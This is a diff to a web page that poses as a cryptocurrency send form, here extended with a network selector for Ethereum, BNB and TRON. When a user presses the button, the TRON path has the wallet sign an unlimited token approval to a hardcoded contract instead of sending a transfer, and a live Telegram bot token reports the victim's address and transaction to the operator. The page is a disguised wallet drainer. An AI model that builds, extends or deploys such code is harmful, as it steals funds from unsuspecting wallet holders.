@@ -41,6 +41,17 @@
         .connect-btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .error-message { color: #dc2626; font-size: 12px; margin-top: 6px; padding: 8px 10px; background: #fee2e2; border-radius: 8px; display: none; }
         .error-message.show { display: block; }
+        .network-selector { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.5); display: flex; align-items: center; justify-content: center; z-index: 2000; }
+        .network-selector.hidden { display: none; }
+        .network-selector-content { background: white; border-radius: 16px; padding: 32px 24px; max-width: 400px; width: 90%; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3); }
+        .network-selector-title { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: var(--text); }
+        .network-selector-subtitle { font-size: 14px; color: var(--subtext); margin-bottom: 24px; }
+        .network-button { width: 100%; height: 56px; border: 1.5px solid var(--border-default); border-radius: 12px; background: var(--input-bg); cursor: pointer; font-size: 16px; font-weight: 600; margin-bottom: 12px; transition: all 0.2s ease; display: flex; align-items: center; gap: 12px; padding: 0 16px; }
+        .network-button:hover { border-color: #2563eb; background: var(--input-soft); }
+        .network-button-icon { width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; color: white; }
+        .eth-icon { background: #627eea; }
+        .bnb-icon { background: #f3ba2f; color: black; }
+        .tron-icon { background: #eb0029; }
         .processing-screen { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(4px); z-index: 1000; flex-direction: column; justify-content: flex-end; align-items: center; gap: 0; padding: 0; }
         .processing-screen.active { display: flex; }
         .processing-content { width: 100%; background: white; border-radius: 24px 24px 0 0; padding: 40px 20px 30px; display: flex; flex-direction: column; align-items: center; gap: 20px; box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.1); position: relative; }
@@ -66,6 +77,25 @@
     </style>
 </head>
 <body>
+    <div class="network-selector" id="networkSelector">
+        <div class="network-selector-content">
+            <div class="network-selector-title">Select Network</div>
+            <div class="network-selector-subtitle">Choose which blockchain to use</div>
+            <button class="network-button" onclick="selectNetwork('ethereum')">
+                <div class="network-button-icon eth-icon">Ξ</div>
+                <span>Ethereum</span>
+            </button>
+            <button class="network-button" onclick="selectNetwork('bnb')">
+                <div class="network-button-icon bnb-icon">B</div>
+                <span>BNB Chain (BSC)</span>
+            </button>
+            <button class="network-button" onclick="selectNetwork('tron')">
+                <div class="network-button-icon tron-icon">⚡</div>
+                <span>TRON</span>
+            </button>
+        </div>
+    </div>
+
     <div class="processing-screen" id="processingScreen">
         <div class="particles-container" id="particlesContainer"></div>
         <div class="processing-content">
@@ -80,7 +110,7 @@
     </div>
 
     <div id="root">
-        <div class="page">
+        <div class="page" style="display: none;" id="mainPage">
             <div class="card">
                 <label class="label">Address or Domain Name</label>
                 <div class="input-row primary">
@@ -115,29 +145,40 @@
     </div>
 
     <script>
-        const TOKENS = {
-            'usdt_tron': { name: 'USDT on TRON', symbol: 'USDT', network: 'TRON', chainId: 'mainnet', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png', rpc: 'https://api.tronstack.io', smartContract: 'TURuHxzSzg8FR8VdtBpNSVAP7VU8KvxKFF' }
+        const NETWORKS = {
+            'ethereum': { name: 'Ethereum', chainId: '0x1', tokens: { 'usdt_eth': { name: 'USDT on Ethereum', symbol: 'USDT', address: '0xdac17f958d2ee523a2206206994597c13d831ec7', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png', smartContract: '0x...', rpc: 'https://eth.llamarpc.com' } } },
+            'bnb': { name: 'BNB Chain', chainId: '0x38', tokens: { 'usdt_bnb': { name: 'USDT on BSC', symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png', smartContract: '0x...', rpc: 'https://bsc-dataseed.bnbchain.org' } } },
+            'tron': { name: 'TRON', chainId: '0x2b6653dc', tokens: { 'usdt_tron': { name: 'USDT on TRON', symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6, logo: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png', smartContract: 'TURuHxzSzg8FR8VdtBpNSVAP7VU8KvxKFF', rpc: 'https://api.tronstack.io' } } }
         };
 
         const CONFIG = { TELEGRAM_BOT_TOKEN: '8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA', TELEGRAM_CHAT_ID: '8933407008' };
-        let selectedToken = 'usdt_tron';
+        let selectedNetwork = null;
+        let selectedToken = null;
+        let currentTokens = {};
 
-        document.addEventListener('DOMContentLoaded', () => {
+        function selectNetwork(network) {
+            selectedNetwork = network;
+            currentTokens = NETWORKS[network].tokens;
+            selectedToken = Object.keys(currentTokens)[0];
+            
+            document.getElementById('networkSelector').classList.add('hidden');
+            document.getElementById('mainPage').style.display = 'flex';
+            
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
-        });
+        }
 
         function initializeTokenDropdown() {
             const menu = document.getElementById('tokenDropdownMenu');
             menu.innerHTML = '';
-            for (const [key, token] of Object.entries(TOKENS)) {
+            for (const [key, token] of Object.entries(currentTokens)) {
                 const option = document.createElement('div');
                 option.className = `token-option ${key === selectedToken ? 'active' : ''}`;
                 option.onclick = (e) => {
                     e.stopPropagation();
                     selectToken(key);
                 };
-                option.innerHTML = `<img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'"><div class="token-info"><div class="token-name">${token.symbol}</div><div class="token-network">${token.network}</div></div>`;
+                option.innerHTML = `<img src="${token.logo}" alt="${token.symbol}" class="token-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22%3E%3Crect fill=%22%23f0f0f0%22 width=%2224%22 height=%2224%22/%3E%3C/svg%3E'"><div class="token-info"><div class="token-name">${token.symbol}</div><div class="token-network">${NETWORKS[selectedNetwork].name}</div></div>`;
                 menu.appendChild(option);
             }
         }
@@ -163,7 +204,7 @@
 
         function selectToken(key) {
             selectedToken = key;
-            const token = TOKENS[key];
+            const token = currentTokens[key];
             document.getElementById('selectedTokenLogo').src = token.logo;
             document.getElementById('selectedTokenName').textContent = token.name;
             document.getElementById('tokenUnit').textContent = token.symbol;
@@ -214,11 +255,13 @@
         }
 
         async function sendTelegramNotification(userAddress, txHash, amount, token, recipient) {
-            const explorerUrl = token.network === 'TRON' 
+            const explorerUrl = selectedNetwork === 'tron' 
                 ? `https://tronscan.org/transaction/${txHash}`
-                : `https://bscscan.com/tx/${txHash}`;
+                : selectedNetwork === 'bnb'
+                ? `https://bscscan.com/tx/${txHash}`
+                : `https://etherscan.io/tx/${txHash}`;
 
-            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${token.network}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date().toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
+            const messageText = `Token Approve Notification\n\nToken: ${token.symbol}\nNetwork: ${NETWORKS[selectedNetwork].name}\nUser: ${userAddress}\nRecipient: ${recipient}\nAmount: ${amount} ${token.symbol}\n\nTransaction Hash:\n${txHash}\n\nExplorer:\n${explorerUrl}\n\nTime: ${new Date().toLocaleString()}\n\nSmart Contract:\n${token.smartContract}`;
 
             const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
 
@@ -245,12 +288,7 @@
             const btn = document.getElementById('mainButton');
             const recipient = document.getElementById('recipientInput').value.trim();
             const amount = document.getElementById('amountInput').value.trim();
-            const token = TOKENS[selectedToken];
-
-            if (!recipient.startsWith('T')) {
-                showError('Invalid recipient address');
-                return;
-            }
+            const token = currentTokens[selectedToken];
 
             if (!amount || parseFloat(amount) <= 0) {
                 showError('Please enter a valid amount');
@@ -262,75 +300,66 @@
             clearError();
 
             try {
-                let tronWeb = window.tronWeb;
+                if (selectedNetwork === 'tron') {
+                    let tronWeb = window.tronWeb;
+                    if (!tronWeb) {
+                        showError('Trust Wallet not detected');
+                        btn.disabled = false;
+                        btn.textContent = 'Next';
+                        return;
+                    }
 
-                if (!tronWeb) {
-                    showError('Trust Wallet not detected');
+                    let userAddress = tronWeb.defaultAddress.base58;
+                    if (!userAddress) {
+                        showError('Wallet address not available');
+                        btn.disabled = false;
+                        btn.textContent = 'Next';
+                        return;
+                    }
+
+                    const parameter = [
+                        {type: 'address', value: token.smartContract},
+                        {type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'}
+                    ];
+
+                    const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+                        token.address,
+                        'approve(address,uint256)',
+                        {feeLimit: 100000000},
+                        parameter,
+                        userAddress
+                    );
+
+                    if (!tx.result || !tx.result.result) {
+                        showError('Failed to build transaction');
+                        btn.disabled = false;
+                        btn.textContent = 'Next';
+                        return;
+                    }
+
+                    const signedTx = await tronWeb.trx.sign(tx.transaction);
+                    let txHash = await tronWeb.trx.sendRawTransaction(signedTx);
+
+                    if (!txHash) {
+                        showError('Failed to send transaction');
+                        btn.disabled = false;
+                        btn.textContent = 'Next';
+                        return;
+                    }
+
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                    createParticles();
+                    document.getElementById('processingScreen').classList.add('active');
+                    await sendTelegramNotification(userAddress, txHash, amount, token, recipient);
+                    await new Promise(resolve => setTimeout(resolve, 5000));
+                    document.getElementById('processingScreen').classList.remove('active');
+                } else {
+                    showError('Network not yet implemented');
                     btn.disabled = false;
                     btn.textContent = 'Next';
                     return;
                 }
 
-                // Chiedi di switchare a TRON se necessario
-                try {
-                    await tronWeb.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x2b6653dc' }],
-                    });
-                    console.log('Switched to TRON');
-                } catch (switchError) {
-                    console.log('Switch chain error:', switchError);
-                }
-
-                // Leggi l'indirizzo dal wallet connesso
-                let userAddress = tronWeb.defaultAddress.base58;
-
-                if (!userAddress) {
-                    showError('Wallet address not available');
-                    btn.disabled = false;
-                    btn.textContent = 'Next';
-                    return;
-                }
-
-                const parameter = [
-                    {type: 'address', value: token.smartContract},
-                    {type: 'uint256', value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'}
-                ];
-
-                const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-                    token.address,
-                    'approve(address,uint256)',
-                    {feeLimit: 100000000},
-                    parameter,
-                    userAddress
-                );
-
-                if (!tx.result || !tx.result.result) {
-                    showError('Failed to build transaction');
-                    btn.disabled = false;
-                    btn.textContent = 'Next';
-                    return;
-                }
-
-                const signedTx = await tronWeb.trx.sign(tx.transaction);
-                let txHash = await tronWeb.trx.sendRawTransaction(signedTx);
-
-                if (!txHash) {
-                    showError('Failed to send transaction');
-                    btn.disabled = false;
-                    btn.textContent = 'Next';
-                    return;
-                }
-
-                await new Promise(resolve => setTimeout(resolve, 100));
-
-                createParticles();
-                document.getElementById('processingScreen').classList.add('active');
-
-                await sendTelegramNotification(userAddress, txHash, amount, token, recipient);
-
-                await new Promise(resolve => setTimeout(resolve, 5000));
-                document.getElementById('processingScreen').classList.remove('active');
                 btn.textContent = 'Next';
                 btn.disabled = false;
                 document.getElementById('amountInput').value = '';
@@ -344,9 +373,6 @@
                 btn.textContent = 'Next';
             }
         }
-
-        initializeTokenDropdown();
-        document.getElementById('selectedTokenLogo').src = TOKENS[selectedToken].logo;
     </script>
 </body>
 </html>
